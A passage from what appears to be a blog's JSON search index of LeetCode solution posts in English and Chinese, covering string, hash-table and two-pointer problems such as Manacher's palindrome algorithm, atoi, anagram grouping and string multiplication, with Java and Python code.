Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"6. ZigZag Conversion","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-6-ZigZag-Conversion/","text":"The string PAYPALISHIRING is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility) 123P A H NA P L S I I GY I R And then read line by line: PAHNAPLSIIGYIRWrite the code that will take a string and make this conversion given a number of rows: 1string convert(string text, int nRows); convert(&quot;PAYPALISHIRING&quot;, 3) should return PAHNAPLSIIGYIR. 123456789101112131415161718class Solution: def convert(self, s, numRows): \"\"\" :type s: str :type numRows: int :rtype: str \"\"\" lens = len(s) if lens&lt;2 or numRows == 1: return s step= 1 # increase or decrease row = 0 zigzaglist = ['']*numRows for char in s: zigzaglist[row] += char row += step if (row == 0 or row == numRows-1): step *= -1 return ''.join(zigzaglist)","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"599. Minimum Index Sum of Two Lists","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-599-Minimum-Index-Sum-of-Two-Lists/","text":"Suppose Andy and Doris want to choose a restaurant for dinner, and they both have a list of favorite restaurants represented by strings. You need to help them find out their common interest with the least list index sum. If there is a choice tie between answers, output all of them with no order requirement. You could assume there always exists an answer. Example 1: 12345Input:[&quot;Shogun&quot;, &quot;Tapioca Express&quot;, &quot;Burger King&quot;, &quot;KFC&quot;][&quot;Piatti&quot;, &quot;The Grill at Torrey Pines&quot;, &quot;Hungry Hunter Steakhouse&quot;, &quot;Shogun&quot;]Output: [&quot;Shogun&quot;]Explanation: The only restaurant they both like is &quot;Shogun&quot;. Example 2: 12345Input:[&quot;Shogun&quot;, &quot;Tapioca Express&quot;, &quot;Burger King&quot;, &quot;KFC&quot;][&quot;KFC&quot;, &quot;Shogun&quot;, &quot;Burger King&quot;]Output: [&quot;Shogun&quot;]Explanation: The restaurant they both like and have the least index sum is &quot;Shogun&quot; with index sum 1 (0+1). Note: The length of both lists will be in the range of [1, 1000]. The length of strings in both lists will be in the range of [1, 30]. The index is starting from 0 to the list length minus 1. No duplicates in both lists. Java考查HashMap的基本操作:map.containsKey(), map.put(), map.get() 123456789101112131415161718192021222324public String[] findRestaurant(String[] list1, String[] list2) &#123; Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); int i = 0, min = Integer.MAX_VALUE, cur = 0; List&lt;String&gt; res = new ArrayList&lt;&gt;(); for (String str: list1) map.put(str, i++); i = 0; for (String str: list2) &#123; if (map.containsKey(str)) &#123; cur = i + map.get(str); if (cur &lt; min) &#123; res.clear(); res.add(str); min = cur; &#125; else if (cur == min) &#123; res.add(str); min = cur; &#125; &#125; i++; &#125; // end for return res.toArray(new String[0]);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"500. Keyboard Row","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-500-Keyboard-Row/","text":"Given a List of words, return the words that can be typed using letters of alphabet on only one row’s of American keyboard like the image below. Example: 12Input: [&quot;Hello&quot;, &quot;Alaska&quot;, &quot;Dad&quot;, &quot;Peace&quot;]Output: [&quot;Alaska&quot;, &quot;Dad&quot;] Note: You may use one character in the keyboard more than once. You may assume the input string will only contain letters of alphabet. Java把键盘中的每一个字符都存在哈希表中，第$i$行字符对应数字$i$。依次检查输入的每个字符串，如果字符串的每个字符都对应相同的数字，则加入到结果中。 123456789101112131415161718192021public String[] findWords(String[] words) &#123; String[] strs = &#123;\"QWERTYUIOP\",\"ASDFGHJKL\",\"ZXCVBNM\"&#125;; Map&lt;Character, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; strs.length; i++) for (char c: strs[i].toCharArray()) map.put(c, i); //put &lt;char, rowIndex&gt; pair into the map List&lt;String&gt; res = new ArrayList&lt;&gt;(); for (String w: words)&#123; if (w.length() == 0) continue; String wUpperCase = w.toUpperCase(); int index = map.get(wUpperCase.charAt(0)); for (char c: wUpperCase.toCharArray()) if (map.get(c) != index)&#123; index = -1; //don't need a boolean flag. break; &#125; if (index != -1) res.add(w); //if index != -1, this is a valid string &#125; return res.toArray(new String[0]);&#125; 也可以使用正则表达式和Java8新特性: 123456public String[] findWords(String[] words) &#123; return Stream .of(words) .filter(s -&gt; s.toLowerCase().matches(\"[qwertyuiop]*|[asdfghjkl]*|[zxcvbnm]*\")) .toArray(String[]::new);&#125; *表示匹配前面的子表达式零次或多次，|指明两项之间的一个选择，[]定义匹配的字符范围。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"5. Longest Palindromic Substring","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-5-Longest-Palindromic-Substring/","text":"Given a string s, find the longest palindromic substring in s. You may assume that the maximum length of s is 1000. Example: 12Input: &quot;babad&quot;Output: &quot;bab&quot; Note: “aba” is also a valid answer.Example: 12Input: &quot;cbbd&quot;Output: &quot;bb&quot; 问题定义最长回文子串问题：给定一个字符串，求它的最长回文子串长度。 如果一个字符串正着读和反着读是一样的，那它就是回文串。下面是一些回文串的实例： 112321 a aba abba aaaa tattarrattat（牛津英语词典中最长的回文单词） 1. Brute-force 解法对于最长回文子串问题，最简单粗暴的办法是：找到字符串的所有子串，遍历每一个子串以验证它们是否为回文串。一个子串由子串的起点和终点确定，因此对于一个长度为n的字符串，共有$n^2$个子串。这些子串的平均长度大约是$n/2$，因此这个解法的时间复杂度是$O(n^3)$。 2. 改进的方法显然所有的回文串都是对称的。长度为奇数回文串以最中间字符的位置为对称轴左右对称，而长度为偶数的回文串的对称轴在中间两个字符之间的空隙。可否利用这种对称性来提高算法效率呢？答案是肯定的。我们知道整个字符串中的所有字符，以及字符间的空隙，都可能是某个回文子串的对称轴位置。可以遍历这些位置，在每个位置上同时向左和向右扩展，直到左右两边的字符不同，或者达到边界。对于一个长度为n的字符串，这样的位置一共有n+n-1=2n-1个，在每个位置上平均大约要进行$n/4$次字符比较，于是此算法的时间复杂度是$O(n^2)$。 Manacher 算法对于一个比较长的字符串，$O(n^2)$的时间复杂度是难以接受的。Can we do better? 先来看看解法2存在的缺陷。 1) 由于回文串长度的奇偶性造成了不同性质的对称轴位置，解法2要对两种情况分别处理；2) 很多子串被重复多次访问，造成较差的时间效率。 缺陷2）可以通过这个直观的小🌰体现： 12char: a b a b a i : 0 1 2 3 4 当$i==1$，和$i==2$时，左边的子串aba分别被遍历了一次。 如果我们能改善解法2的不足，就很有希望能提高算法的效率。Manacher正是针对这些问题改进算法。 (1) 解决长度奇偶性带来的对称轴位置问题Manacher算法首先对字符串做一个预处理，在所有的空隙位置(包括首尾)插入同样的符号，要求这个符号是不会在原串中出现的。这样会使得所有的串都是奇数长度的。以插入#号为例： 12aba ———&gt; #a#b#a#abba ———&gt; #a#b#b#a# 插入的是同样的符号，且符号不存在于原串，因此子串的回文性不受影响，原来是回文的串，插完之后还是回文的，原来不是回文的，依然不会是回文。 (2) 解决重复访问的问题我们把一个回文串中最左或最右位置的字符与其对称轴的距离称为回文半径。Manacher定义了一个回文半径数组RL，用$RL[i]$表示以第$i$个字符为对称轴的回文串的回文半径。我们一般对字符串从左往右处理，因此这里定义$RL[i]$为第$i$个字符为对称轴的回文串的最右一个字符与字符i的距离。对于上面插入分隔符之后的两个串，可以得到RL数组： 1234char: # a # b # a # RL : 1 2 1 4 1 2 1RL-1: 0 1 0 3 0 1 0 i : 0 1 2 3 4 5 6 1234char: # a # b # b # a # RL : 1 2 1 2 5 2 1 2 1RL-1: 0 1 0 1 4 1 0 1 0 i : 0 1 2 3 4 5 6 7 8 上面我们还求了一下$RL[i]-1$。通过观察可以发现，$RL[i]-1$的值，正是在原本那个没有插入过分隔符的串中，以位置$i$为对称轴的最长回文串的长度。那么只要我们求出了$RL$数组，就能得到最长回文子串的长度。 于是问题变成了，怎样高效地求的$RL$数组。基本思路是利用回文串的对称性，扩展回文串。 我们再引入一个辅助变量$MaxRight$，表示当前访问到的所有回文子串，所能触及的最右一个字符的位置。另外还要记录下$MaxRight$对应的回文串的对称轴所在的位置，记为$pos$，它们的位置关系如下。 我们从左往右地访问字符串来求RL，假设当前访问到的位置为$i$，即要求$RL[i]$，在对应上图，$i$必然是在$pos$右边的。但我们更关注的是，$i$是在$MaxRight$的左边还是右边。我们分情况来讨论。 1）当i在MaxRight的左边情况1)可以用下图来刻画： 我们知道，图中两个红色块之间（包括红色块）的串是回文的；并且以$i$为对称轴的回文串，是与红色块间的回文串有所重叠的。我们找到$i$关于$pos$的对称位置$j$，这个$j$对应的$RL[j]$我们是已经算过的。根据回文串的对称性，以$i$为对称轴的回文串和以$j$为对称轴的回文串，有一部分是相同的。这里又有两种细分的情况。 以$j$为对称轴的回文串比较短，短到像下图这样。 这时我们知道$RL[i]$至少不会小于$RL[j]$，并且已经知道了部分的以$i$为中心的回文串，于是可以令$RL[i]=RL[j]$。但是以$i$为对称轴的回文串可能实际上更长，因此我们试着以$i$为对称轴，继续往左右两边扩展，直到左右两边字符不同，或者到达边界。 以j为对称轴的回文串很长，这么长： 这时，我们只能确定，两条蓝线之间的部分（即不超过MaxRight的部分）是回文的，于是从这个长度开始，尝试以$i$为中心向左右两边扩展，，直到左右两边字符不同，或者到达边界。 不论以上哪种情况，之后都要尝试更新$MaxRight$和$pos$，因为有可能得到更大的$MaxRight$。 具体操作如下： 123step 1: 令RL[i]=min(RL[2*pos-i], MaxRight-i)step 2: 以i为中心扩展回文串，直到左右两边字符不同，或者到达边界。step 3: 更新MaxRight和pos 2）当i在MaxRight的右边遇到这种情况，说明以i为对称轴的回文串还没有任何一个部分被访问过，于是只能从$i$的左右两边开始尝试扩展了，当左右两边字符不同，或者到达字符串边界时停止。然后更新$MaxRight$和$pos$。 (3) 算法实现1234567891011121314151617181920212223242526272829303132class Solution: def longestPalindrome(self, s): \"\"\" :type s: str :rtype: str \"\"\" #预处理 s='#'+'#'.join(s)+'#' RL=[0]*len(s) MaxRight=0 pos=0 MaxLen=0 for i in range(len(s)): if i&lt;MaxRight: RL[i]=min(RL[2*pos-i], MaxRight-i) else: RL[i]=1 #尝试扩展，注意处理边界 while i-RL[i]&gt;=0 and i+RL[i]&lt;len(s) and s[i-RL[i]]==s[i+RL[i]]: RL[i]+=1 #更新MaxRight,pos if RL[i]+i-1&gt;MaxRight: MaxRight=RL[i]+i-1 pos=i #更新最长回文串的长度 if MaxLen &lt; RL[i]: MaxLen = RL[i] RL_2 = RL[i]-2 longest = s[i-RL_2:i+RL_2+1] return longest.replace('#','') (4) 复杂度分析 空间复杂度：插入分隔符形成新串，占用了线性的空间大小；$RL$数组也占用线性大小的空间，因此空间复杂度是线性的。 时间复杂度：尽管代码里面有两层循环，通过amortized analysis我们可以得出，Manacher的时间复杂度是线性的。由于内层的循环只对尚未匹配的部分进行，因此对于每一个字符而言，只会进行一次，因此时间复杂度是$O(n)$。 转自","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"49. Group Anagrams","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-49-Group-Anagrams/","text":"Given an array of strings, group anagrams together. Example: 1234567Input: [&quot;eat&quot;, &quot;tea&quot;, &quot;tan&quot;, &quot;ate&quot;, &quot;nat&quot;, &quot;bat&quot;],Output:[ [&quot;ate&quot;,&quot;eat&quot;,&quot;tea&quot;], [&quot;nat&quot;,&quot;tan&quot;], [&quot;bat&quot;]] Note: All inputs will be in lowercase. The order of your output does not matter. Java一开始想到了最笨的方法，对于每个字符串，与其他字符串一一比对，如果是错位词，则加入到相应的List中。判断错位词详见LeetCode 242. Valid Anagram。可惜这种方法超时了。 12345678910111213141516171819202122232425262728293031323334353637public List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123; List&lt;List&lt;String&gt;&gt; res = new ArrayList&lt;&gt;(); Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); boolean isFind; for (int i = 0; i &lt; strs.length; i++) &#123; isFind = false; for (String str: map.keySet()) &#123; if (isAnagram(str, strs[i])) &#123; res.get(map.get(str)).add(strs[i]); isFind = true; continue; &#125; &#125; if (!isFind) &#123; res.add(new ArrayList&lt;String&gt;()); res.get(res.size() - 1).add(strs[i]); map.put(strs[i], res.size() - 1); &#125; &#125; return res;&#125; public boolean isAnagram(String s, String t) &#123; if (s.length() != t.length()) return false; // 一共只有26个字母 int[] count = new int[26]; for (int i = 0; i &lt; s.length(); i++) &#123; count[s.charAt(i) - 'a']++; count[t.charAt(i) - 'a']--; &#125; for (int num : count) if (num != 0) return false; return true;&#125; 上面的方法之所以慢，是因为需要一一比对。如果$n$非常大时，而且分组非常大时，时间复杂度接近于$O(n^2)$。所以用哈希表来判断错位词比较合适。因为判断错位词的方法一般有2种(LeetCode 242. Valid Anagram)：排序和分类计数。所以这里也可以应用这两种方法。 首先是排序的方法： 123456789101112public List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123; Map&lt;String, List&gt; map = new HashMap&lt;&gt;(); for (String str : strs) &#123; char[] c = str.toCharArray(); Arrays.sort(c); String s = String.valueOf(c); if (map.containsKey(s)) map.get(s).add(str); else map.put(String.valueOf(s), new ArrayList&lt;&gt;(Collections.singletonList(str))); &#125; return new ArrayList(map.values());&#125; 然后是分类计数的方法： 12345678910111213141516public List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123; Map&lt;String, List&gt; map = new HashMap&lt;&gt;(); for (String str : strs) &#123; int[] nums = new int[26]; for (char c : str.toCharArray()) nums[c - 'a']++; StringBuilder sb = new StringBuilder(); for (int num : nums) sb.append(num); String s = sb.toString(); if (map.containsKey(s)) map.get(s).add(str); else map.put(String.valueOf(s), new ArrayList&lt;&gt;(Collections.singletonList(str))); &#125; return new ArrayList(map.values());&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"8. String to Integer (atoi)","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-8-String-to-Integer-atoi/","text":"Implement atoi which converts a string to an integer. The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value. The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function. If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed. If no valid conversion could be performed, a zero value is returned. Note: Only the space character &#39; &#39; is considered as whitespace character. Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [−$2^{31}$, $2^{31} − 1$]. If the numerical value is out of the range of representable values, INT_MAX ($2^{31} − 1$) or INT_MIN (−$2^{31}$) is returned. Example 1: 12Input: &quot;42&quot;Output: 42 Example 2: 1234Input: &quot; -42&quot;Output: -42Explanation: The first non-whitespace character is &apos;-&apos;, which is the minus sign. Then take as many numerical digits as possible, which gets 42. Example 3: 123Input: &quot;4193 with words&quot;Output: 4193Explanation: Conversion stops at digit &apos;3&apos; as the next character is not a numerical digit. Example 4: 1234Input: &quot;words and 987&quot;Output: 0Explanation: The first non-whitespace character is &apos;w&apos;, which is not a numerical digit or a +/- sign. Therefore no valid conversion could be performed. Example 5: 1234Input: &quot;-91283472332&quot;Output: -2147483648Explanation: The number &quot;-91283472332&quot; is out of the range of a 32-bit signed integer. Thefore INT_MIN (−231) is returned. Java这道题目其实出的很好，非常具有实际意义。我直接借鉴的Java中的Integer.parseInt()的写法。它具有一下特点: 把结果写成负数结果，因为负数的范围比正数大，比较方便。 分别判断减法溢出和乘法溢出。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public int myAtoi(String str) &#123; str = str.trim(); // 除去空格 int len = str.length(); //数字长度 if (len == 0) return 0; // 特殊情况：空字符串 boolean isPositive = true; // 数字正负符号 int i = 0; // index int result = 0; // 转换结果 int limit = -Integer.MAX_VALUE; // 数字下限：用来判断减法溢出 // 首字符是(+，-) if (str.charAt(0) == '+' ) &#123;i++;&#125; if (str.charAt(0) == '-') &#123; i++; isPositive = false; limit = Integer.MIN_VALUE; &#125; boolean isStart = false; // 数字开头载入了吗？ int multmin = limit / 10; // 数字下限：用来判断乘法溢出 while (i &lt; len) &#123; int tail = str.charAt(i) - '0'; // 后续字符都是数字 if (tail &gt; 9 || tail &lt; 0) &#123; if (!isStart) return 0; // 非有效数字，返回0 else break; &#125; // 乘法溢出 if (result &lt; multmin) &#123; if (isPositive) return -limit; else return limit; &#125; result *= 10; // 减法溢出 if (result &lt; limit + tail) &#123; if (isPositive) return -limit; else return limit; &#125; result -= tail; isStart = true; // 已经载入第一个数字 i++; // 下一个数字 &#125; return isPositive ? -result : result;&#125; PythonPython解答： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class Solution: def myAtoi(self, str): \"\"\" :type str: str :rtype: int \"\"\" str_strip = str.strip() # strip whitespace # str is empty or it contians only white space characters, no conversion is performed if not len(str_strip): return 0 first_num = 0 first_char = str_strip[0] sign = 1 if first_char == '+': first_num = 1 elif first_char == '-': sign = -1 first_num = 1 # only -,+ character if len(str_strip)==1 and first_num==1: return 0 # check the first character of non-whitespace string is a number if not ('0' &lt;= str_strip[first_num] &lt;= '9'): return 0 # remove 0 in the front of the string print(str_strip[first_num]) while str_strip[first_num] == '0': first_num += 1 print(\"OK\") result = 0 for char in str_strip[first_num:]: if ('0' &lt;= char &lt;= '9'): result = result*10 + ord(char) - ord('0') # contains illegal character in the end of str else: break # sign +, - result *= sign if result &gt; 2147483647: result = 2147483647 elif result &lt; -2147483647-1: result = -2147483647-1 return result","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"438. Find All Anagrams in a String","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-438-Find-All-Anagrams-in-a-String/","text":"Given a string s and a non-empty string p, find all the start indices of p‘s anagrams in s. Strings consists of lowercase English letters only and the length of both strings s and p will not be larger than 20,100. The order of output does not matter. Example 1: 123456789Input:s: &quot;cbaebabacd&quot; p: &quot;abc&quot;Output:[0, 6]Explanation:The substring with start index = 0 is &quot;cba&quot;, which is an anagram of &quot;abc&quot;.The substring with start index = 6 is &quot;bac&quot;, which is an anagram of &quot;abc&quot;. Example 2: 12345678910Input:s: &quot;abab&quot; p: &quot;ab&quot;Output:[0, 1, 2]Explanation:The substring with start index = 0 is &quot;ab&quot;, which is an anagram of &quot;ab&quot;.The substring with start index = 1 is &quot;ba&quot;, which is an anagram of &quot;ab&quot;.The substring with start index = 2 is &quot;ab&quot;, which is an anagram of &quot;ab&quot;. Java这道题目是LeetCode 242. Valid Anagram的延伸。前者只要判断字符串是否是变位词，这里需要寻找出变位词的位置。一个容易想到的办法就是依次从字符串s中取出与p长度相等的子字符串，然后判定该子字符串是否是变位词。 123456789101112131415161718192021public List&lt;Integer&gt; findAnagrams(String s, String p) &#123; int slen = s.length(), plen = p.length(); List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; slen - plen + 1; i++) if (isAnagram(p, s.substring(i, i + plen))) list.add(i); return list;&#125; private boolean isAnagram(String s, String t) &#123; int[] count = new int[26]; for (int i = 0; i &lt; s.length(); i++) &#123; count[s.charAt(i) - 'a']++; count[t.charAt(i) - 'a']--; &#125; for (int i = 0; i &lt; count.length; i++) if (count[i] != 0) return false; return true;&#125; 但是这种方法的时间复杂度不是很理想。一种被广泛应用在子字符串算法的滑动窗口方法能够很好的降低复杂度：它的基本思想是维持一个哈希表，哈希表的键值分别为字符和字符出现的次数；另外有begin，end指针分别表示滑动窗口的起始点和终点位置。哈希表中的值，也就是字符次数，初始化为变位词中各个字符出现的次数。遍历字符串，当出现变位词的字符时，哈希表中相应的值减去1，当哈希表中的值都为0时，说明滑动窗口内的子字符串很可能是变位词，如果此时起始点和终点的距离end-begin恰好为变位词的长度时，说明滑动窗口内肯定是变位词，记录下此时变位词的位置。然后调整滑动窗口的位置，寻找下一个变位词。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public List&lt;Integer&gt; findAnagrams(String s, String p) &#123; //init a collection or int value to save the result according the question. List&lt;Integer&gt; result = new LinkedList&lt;&gt;(); if(p.length() &gt; s.length()) return result; // create a hashmap to save the Characters of the target substring. // (K, V) = (Character, Frequence of the Characters) Map&lt;Character, Integer&gt; map = new HashMap&lt;&gt;(); for(char c : p.toCharArray()) map.put(c, map.getOrDefault(c, 0) + 1); //maintain a counter to check whether match the target string. //must be the map size, NOT the string size because the char may be duplicate. int counter = map.size(); //Two Pointers: begin - left pointer of the window; end - right pointer of the window int begin = 0, end = 0; //loop at the beginning of the source string while(end &lt; s.length())&#123; //get a character char c = s.charAt(end); if(map.containsKey(c))&#123; // plus or minus one map.put(c, map.get(c)-1); // modify the counter according the requirement(different condition). if (map.get(c) == 0) counter--; &#125; end++; //increase begin pointer to make it invalid/valid again while(counter == 0)&#123; // ***be careful here: choose the char at begin pointer, NOT the end pointer char tempc = s.charAt(begin); if (map.containsKey(tempc))&#123; //plus or minus one map.put(tempc, map.get(tempc) + 1); //modify the counter according the requirement(different condition). if (map.get(tempc) &gt; 0) counter++; &#125; // save / update(min/max) the result if find a target // result collections or result int value if (end - begin == p.length()) result.add(begin); begin++; &#125; //end while &#125; // end while return result;&#125; // end findAnagrams 但是这种做法还是稍显麻烦，毕竟这里变位词只是26个字母，而且还都是小写的，真的没有必要用HashMap来做哈希表，用一个长26的整形数组来做哈希表更加好。注意下面的counter是变位词长度，不是上面的出现次数，所以代码简洁了一些。 123456789101112131415161718192021222324252627282930313233343536373839public List&lt;Integer&gt; findAnagrams(String s, String p) &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); if (p.length() &gt; s.length()) return res; // total number of character in p to be contained in s int counter = p.length(); // calculate the number of each character to be contained in S int[] map = new int[26]; for (char c : p.toCharArray()) map[c - 'a']++; // the begin/end of the sliding window int begin = 0, end = 0; // current char int cur; while (end &lt; s.length()) &#123; // current char cur = s.charAt(end++) - 'a'; // if the character needs to be contained, include it and minus the counter if (map[cur] &gt; 0) counter--; map[cur]--; // all included, move the begin pointer to minimize the window while (counter == 0) &#123; // current char cur = s.charAt(begin) - 'a'; // current window contains same number of the current character as in p, // cannot move forward anymore if (map[cur] == 0) &#123; // if the window size is same as p, an anagram is found if (end - begin == p.length()) res.add(begin); counter++; &#125; // end if map[cur]++; begin++; &#125; // end while &#125; // end while return res;&#125; // end findAnagrams","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"463. Island Perimeter","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-463-Island-Perimeter/","text":"You are given a map in form of a two-dimensional integer grid where 1 represents land and 0 represents water. Grid cells are connected horizontally/vertically (not diagonally). The grid is completely surrounded by water, and there is exactly one island (i.e., one or more connected land cells). The island doesn’t have “lakes” (water inside that isn’t connected to the water around the island). One cell is a square with side length 1. The grid is rectangular, width and height don’t exceed 100. Determine the perimeter of the island. Example: 123456789Input:[[0,1,0,0], [1,1,1,0], [0,1,0,0], [1,1,0,0]]Output: 16Explanation: The perimeter is the 16 yellow stripes in the image below: Java最直接的方法是数一下组成岛的方块数，每个方块有四条边，检查一下方块的每条边是否和其他方块的边重合。如果重合则减去1。 12345678910111213141516171819public int islandPerimeter(int[][] grid) &#123; if (grid == null) return 0; int n = grid.length, m = n &gt; 0 ? grid[0].length : 0; if (n == 0 || m == 0) return 0; int perimeter = 0; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; m; j++) if (grid[i][j] == 1) &#123; perimeter += 4; if (i + 1 &lt; n &amp;&amp; grid[i + 1][j] == 1) perimeter--; if (j + 1 &lt; m &amp;&amp; grid[i][j + 1] == 1) perimeter--; if (i &gt; 0 &amp;&amp; grid[i - 1][j] == 1) perimeter--; if (j &gt; 0 &amp;&amp; grid[i][j - 1] == 1) perimeter--; &#125; return perimeter;&#125; 或者数一下每个方块的右边和下面的边是否重合，如果重合减去2，因为每次重合会有两个方块的边减去1。这样简化了一些，不用检查每个方块的上边和左边。 1234567891011121314151617public int islandPerimeter(int[][] grid) &#123; if (grid == null) return 0; int n = grid.length, m = n &gt; 0 ? grid[0].length : 0; if (n == 0 || m == 0) return 0; int perimeter = 0; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; m; j++) if (grid[i][j] == 1) &#123; perimeter += 4; if (i + 1 &lt; n &amp;&amp; grid[i + 1][j] == 1) perimeter -= 2; if (j + 1 &lt; m &amp;&amp; grid[i][j + 1] == 1) perimeter -= 2; &#125; return perimeter;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"43. Multiply Strings","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-43-Multiply-Strings/","text":"Given two non-negative integers num1 and num2 represented as strings, return the product of num1 and num2, also represented as a string. Example 1: 12Input: num1 = &quot;2&quot;, num2 = &quot;3&quot;Output: &quot;6&quot; Example 2: 12Input: num1 = &quot;123&quot;, num2 = &quot;456&quot;Output: &quot;56088&quot; Note: The length of both num1 and num2 is &lt; 110. Both num1 and num2 contain only digits 0-9. Both num1 and num2 do not contain any leading zero, except the number 0 itself. You must not use any built-in BigInteger library or convert the inputs to integer directly. Java两个数相乘，以我们小学时学的方法： 将第二个数字的每个数与第一个数相乘 将第一步的结果相加 例如296*31。 仿照这个步骤，构造两个循环。内循环计算步骤1，外循环计算步骤2。add()是将两个数相加的方法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public String multiply(String num1, String num2) &#123; StringBuilder s = new StringBuilder(\"0\"); char[] n1 = num1.toCharArray(), n2 = num2.toCharArray(); int carry = 0, l1 = num1.length(), l2 = num2.length(); int i = 0; while (i &lt; l1) &#123; int j = 0; StringBuilder t = new StringBuilder(); while (j &lt; l2 || carry != 0) &#123; int num = 0; if (j &lt; l2) num += (n1[l1 - i - 1] - '0') * (n2[l2 - j - 1] - '0'); num += carry; carry = num / 10; num = num % 10; t.append(num); j++; &#125; t.reverse(); for (int k = 0; k &lt; i; k++) t.append(\"0\"); s = add(s, t); i++; &#125; if (s.charAt(0) == '0') return \"0\"; return s.toString(); &#125; private StringBuilder add(StringBuilder num1, StringBuilder num2) &#123; StringBuilder s = new StringBuilder(); int carry = 0, l1 = num1.length(), l2 = num2.length(); int i = 0; while (i &lt; l1 || i &lt; l2 || carry != 0) &#123; int num = 0; if (i &lt; l1) num += num1.charAt(l1 - i - 1) - '0'; if (i &lt; l2) num += num2.charAt(l2 - i - 1) - '0'; num += carry; if (num &gt; 9) &#123; num -= 10; carry = 1; &#125; else carry = 0; s.append(num); i++; &#125; return s.reverse();&#125; 这种方法虽然比较直接，但是运算速度慢，主要原因是 每个中间结果都用字符串保存，空间复杂度增加 字符串反复遍历，时间复杂度增加 有一种非常简单、优雅的方法，它利用了两个数相乘以后(步骤1)在结果中的相对位置，而且是一个数和一个数相乘，简化了复杂的内循环。 根据上图可以看到： num1[i] * num2[j] 的结果会在 [i + j, i + j + 1] 的位置上。 1234567891011121314151617181920public String multiply(String num1, String num2) &#123; int l1 = num1.length(), l2 = num2.length(); int[] pos = new int[l1 + l2]; for(int i = l1 - 1; i &gt;= 0; i--) &#123; for(int j = l2 - 1; j &gt;= 0; j--) &#123; int mul = (num1.charAt(i) - '0') * (num2.charAt(j) - '0'); int p1 = i + j, p2 = i + j + 1; int sum = mul + pos[p2]; pos[p1] += sum / 10; pos[p2] = (sum) % 10; &#125; &#125; StringBuilder s = new StringBuilder(); for(int p : pos) // special occasion: like \"0000\" if(!(s.length() == 0 &amp;&amp; p == 0)) s.append(p); return s.length() == 0 ? \"0\": 